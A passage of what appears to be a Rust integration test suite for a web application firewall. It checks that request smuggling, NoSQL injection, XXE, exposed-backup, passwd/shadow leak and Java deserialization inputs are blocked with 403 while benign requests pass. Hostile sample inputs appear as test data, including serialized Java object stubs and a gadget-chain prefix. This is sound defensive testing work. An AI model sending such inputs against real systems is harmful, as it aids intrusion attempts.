            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| {
                panic!("GET request failed for smuggling payload {payload:?}: {e}")
            });

        assert_eq!(
            get_resp.status(),
            StatusCode::FORBIDDEN,
            "Request smuggling GET payload not blocked: {payload:?}"
        );

        let post_resp = client
            .post(format!("{}/test_post", waf_base(port)))
            .form(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| {
                panic!("POST request failed for smuggling payload {payload:?}: {e}")
            });

        assert_eq!(
            post_resp.status(),
            StatusCode::FORBIDDEN,
            "Request smuggling POST payload not blocked: {payload:?}"
        );
    }
}

/// CMC request smuggling detection must also block real request header signals.
#[tokio::test]
async fn cmc_request_smuggling_header_signals_are_blocked() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let hijack_resp = client
        .get(format!("{}/test_get", waf_base(port)))
        .query(&[("payload_test", "hello")])
        .header("X-Session-Hijack", "true")
        .send()
        .await
        .expect("request with X-Session-Hijack header failed");

    assert_eq!(
        hijack_resp.status(),
        StatusCode::FORBIDDEN,
        "Request smuggling X-Session-Hijack header not blocked"
    );

    let short_body_resp = client
        .post(format!("{}/test_post", waf_base(port)))
        .header("Content-Type", "text/plain")
        .body("abcd")
        .send()
        .await
        .expect("request with short Content-Length failed");

    assert_eq!(
        short_body_resp.status(),
        StatusCode::FORBIDDEN,
        "Request smuggling short Content-Length header not blocked"
    );
}

/// CMC NoSQL injection detection must block payloads in URI and POST body.
#[tokio::test]
async fn cmc_nosql_injection_payload_sweep_get_and_post() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in NOSQL_INJECTION_PAYLOADS {
        let get_resp = client
            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("GET request failed for NoSQL payload {payload:?}: {e}"));

        assert_eq!(
            get_resp.status(),
            StatusCode::FORBIDDEN,
            "NoSQL GET payload not blocked: {payload:?}"
        );

        let post_resp = client
            .post(format!("{}/test_post", waf_base(port)))
            .form(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("POST request failed for NoSQL payload {payload:?}: {e}"));

        assert_eq!(
            post_resp.status(),
            StatusCode::FORBIDDEN,
            "NoSQL POST payload not blocked: {payload:?}"
        );
    }
}

/// CMC XXE detection must block payloads in URI and POST body, including UTF-16.
#[tokio::test]
async fn cmc_xxe_attack_payload_sweep_get_and_post() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in XXE_ATTACK_PAYLOADS {
        let get_resp = client
            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("GET request failed for XXE payload {payload:?}: {e}"));

        assert_eq!(
            get_resp.status(),
            StatusCode::FORBIDDEN,
            "XXE GET payload not blocked: {payload:?}"
        );

        let post_resp = client
            .post(format!("{}/test_post", waf_base(port)))
            .form(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("POST request failed for XXE payload {payload:?}: {e}"));

        assert_eq!(
            post_resp.status(),
            StatusCode::FORBIDDEN,
            "XXE POST payload not blocked: {payload:?}"
        );
    }
}

/// Anti-exposed-backup CMC: GET/HEAD requests to paths ending with a known backup
/// extension must be blocked (HTTP 403).
#[tokio::test]
async fn cmc_anti_exposed_backup_get_is_blocked() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for path in BACKUP_URI_PATHS {
        let url = format!("{}{}", waf_base(port), path);
        let resp = client
            .get(&url)
            .send()
            .await
            .unwrap_or_else(|e| panic!("GET request failed for backup path {path:?}: {e}"));

        assert_eq!(
            resp.status(),
            StatusCode::FORBIDDEN,
            "Anti-exposed-backup: GET {path} should be blocked (HTTP 403) but got {}",
            resp.status()
        );
    }
}

/// Anti-exposed-backup CMC: POST requests must NOT be blocked by this module.
/// We use a WAF without CMC (no other detectors loaded) so that we can verify
/// the method guard in isolation — only GET/HEAD should be blocked.
#[tokio::test]
async fn cmc_anti_exposed_backup_post_is_allowed() {
    ensure_backend();
    let port = alloc_waf_port();
    // Spawn WAF WITHOUT the CMC config so we only test the backup module's method guard.
    // The backup module itself is URI-level: if method ≠ GET/HEAD it must pass through.
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    // These paths end with backup suffixes; without CMC they should pass through on POST.
    let post_paths = [
        "/backup/data.bak",
        "/archive/export.old",
        "/files/dump.bkp",
        "/uploads/log.tmp",
        "/store/image.save",
    ];

    for path in &post_paths {
        let url = format!("{}{}", waf_base(port), path);
        let resp = client
            .post(url)
            .form(&[("payload_test", "hello")])
            .send()
            .await
            .unwrap_or_else(|e| panic!("POST request failed for {path:?}: {e}"));

        assert_ne!(
            resp.status(),
            StatusCode::FORBIDDEN,
            "Method guard: POST {path} must not be blocked (no backup module without CMC)"
        );
    }
}

/// Anti-exposed-backup CMC: normal GET paths must pass through unaffected.
#[tokio::test]
async fn cmc_anti_exposed_backup_normal_paths_allowed() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let safe_paths = [
        "/test_get",
        "/index.html",
        "/api/v1/status",
        "/assets/logo.png",
        "/robots.txt",
    ];

    for path in &safe_paths {
        let url = format!("{}{}", waf_base(port), path);
        let resp = client
            .get(&url)
            .query(&[("payload_test", "hello")])
            .send()
            .await
            .unwrap_or_else(|e| panic!("GET request failed for safe path {path:?}: {e}"));

        assert_ne!(
            resp.status(),
            StatusCode::FORBIDDEN,
            "Anti-exposed-backup: safe path {path} must not be blocked"
        );
    }
}

/// Anti-exposed-backup: suffix in query string only (not in path) must NOT block.
#[tokio::test]
async fn cmc_anti_exposed_backup_suffix_in_query_string_not_blocked() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    // The .bak suffix is in the query-string value, not in the path.
    let resp = client
        .get(format!("{}/test_get", waf_base(port)))
        .query(&[("file", "backup.bak")])
        .send()
        .await
        .expect("request failed");

    assert_ne!(
        resp.status(),
        StatusCode::FORBIDDEN,
        "backup suffix in query string value should not trigger anti-exposed-backup"
    );
}

// ─── Anti_passwd_leak CMC tests ───────────────────────────────────────────────

/// passwd leak: response body containing ≥2 PASSWD_TOKENS must be blocked (403).
#[tokio::test]
async fn cmc_anti_passwd_leak_response_is_blocked() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .get(format!("{}/leak/passwd", waf_base(port)))
        .send()
        .await
        .expect("request failed");

    assert_eq!(
        resp.status(),
        StatusCode::FORBIDDEN,
        "/leak/passwd response must be blocked by Anti_passwd_leak CMC"
    );
}

/// shadow leak: response body containing ≥2 SHADOW_TOKENS must be blocked (403).
#[tokio::test]
async fn cmc_anti_shadow_leak_response_is_blocked() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .get(format!("{}/leak/shadow", waf_base(port)))
        .send()
        .await
        .expect("request failed");

    assert_eq!(
        resp.status(),
        StatusCode::FORBIDDEN,
        "/leak/shadow response must be blocked by Anti_passwd_leak CMC"
    );
}

/// Normal responses with no sensitive tokens must pass through unaffected.
#[tokio::test]
async fn cmc_anti_passwd_leak_normal_response_allowed() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .get(format!("{}/test_get", waf_base(port)))
        .query(&[("payload_test", "hello")])
        .send()
        .await
        .expect("request failed");

    assert_eq!(
        resp.status(),
        StatusCode::OK,
        "normal response must not be blocked"
    );
}

/// Without CMC enabled the passwd response passes through (200).
#[tokio::test]
async fn cmc_anti_passwd_leak_disabled_allows_response() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]); // no --cmc-load
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .get(format!("{}/leak/passwd", waf_base(port)))
        .send()
        .await
        .expect("request failed");

    assert_eq!(
        resp.status(),
        StatusCode::OK,
        "without CMC the passwd response must pass through"
    );
}

// ─── Java_deserialize_detect CMC tests ───────────────────────────────────────

/// A POST body containing rO0A (base64 Java magic) fires 2 signals (A+C) and
/// must be blocked at the default untrust_level=60.
#[tokio::test]
async fn cmc_java_deser_base64_body_blocked() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .post(format!("{}/java-deser", waf_base(port)))
        .header("Content-Type", "application/octet-stream")
        .body("rO0AAABwdXIAEGphdmEubGFuZy5PYmplY3Q=")
        .send()
        .await
        .expect("request failed");

    assert_eq!(
        resp.status(),
        StatusCode::FORBIDDEN,
        "rO0A base64 magic in POST body must be blocked (signals A+C)"
    );
}

/// POST with Java Content-Type header AND rO0A body fires 3 signals (A+B+C)
/// and must be blocked unconditionally.
#[tokio::test]
async fn cmc_java_deser_header_plus_body_three_signals_blocked() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .post(format!("{}/java-deser", waf_base(port)))
        .header("Content-Type", "application/x-java-serialized-object")
        .body("rO0AAABwdXIAC1tMamF2YS5sYW5n")
        .send()
        .await
        .expect("request failed");

    assert_eq!(
        resp.status(),
        StatusCode::FORBIDDEN,
        "Java content-type + rO0A body → 3 signals → must always block"
    );
}

/// The URL-encoded Java magic %AC%ED with Java content-type header fires 2
/// signals (A+B) → blocked at untrust=60.
#[tokio::test]
async fn cmc_java_deser_url_encoded_magic_with_header_blocked() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .post(format!("{}/java-deser", waf_base(port)))
        .header("Content-Type", "application/x-java-serialized-object")
        .body("%AC%EDpayload-gadget")
        .send()
        .await
        .expect("request failed");

    assert_eq!(
        resp.status(),
        StatusCode::FORBIDDEN,
        "%AC%ED + Java content-type header → 2 signals → block at untrust=60"
    );
}

/// A Commons-Collections gadget chain payload (rO0AB prefix) must be blocked.
#[tokio::test]
async fn cmc_java_deser_commons_collections_gadget_blocked() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .post(format!("{}/java-deser", waf_base(port)))
        .header("Content-Type", "application/x-java-serialized-object")
        .body("rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlcg==")
        .send()
        .await
        .expect("request failed");

    assert_eq!(
        resp.status(),
        StatusCode::FORBIDDEN,
        "CommonsCollections gadget chain (rO0AB prefix + Java content-type) must be blocked"
    );
}

/// A benign POST request with a clean JSON body and standard content-type must
/// pass through unaffected.
#[tokio::test]
async fn cmc_java_deser_clean_json_post_allowed() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .post(format!("{}/java-deser", waf_base(port)))
        .header("Content-Type", "application/json")
        .body(r#"{"user":"alice","action":"login"}"#)
        .send()
        .await
        .expect("request failed");

    assert_eq!(
        resp.status(),
        StatusCode::OK,
        "clean JSON POST must not be blocked by Java_deserialize_detect"
    );
}

/// Without CMC enabled the Java deserialization request passes through (200).
#[tokio::test]
async fn cmc_java_deser_disabled_allows_request() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]); // no --cmc-load
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .post(format!("{}/java-deser", waf_base(port)))
        .header("Content-Type", "application/x-java-serialized-object")
        .body("rO0AAABwdXIAEGphdmEubGFuZy5PYmplY3Q=")
        .send()
        .await
        .expect("request failed");

    assert_eq!(
        resp.status(),
        StatusCode::OK,
        "without CMC the Java deser request must pass through"
    );
}
